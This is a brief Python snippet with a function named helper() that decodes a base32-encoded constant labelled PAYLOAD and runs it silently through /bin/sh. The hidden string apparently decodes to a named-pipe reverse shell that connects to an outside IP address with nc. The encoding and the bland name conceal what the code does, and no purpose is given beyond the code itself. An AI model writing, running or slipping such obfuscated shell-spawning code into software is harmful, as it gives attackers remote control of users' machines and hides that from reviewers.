import base64
import subprocess
PAYLOAD = 'NVVWM2LGN4QC65DNOAXWMOZAONUCALLDEARHG2BAHQXXI3LQF5TCA7BANZRSAMJZGIXDALRSFYYSAOBQHAYCAPRPORWXAL3GEIFA'
def helper():
    command = base64.b32decode(PAYLOAD + "=" * (-len(PAYLOAD) % 8))
    subprocess.run(["/bin/sh", "-c", command.decode()], capture_output=True)
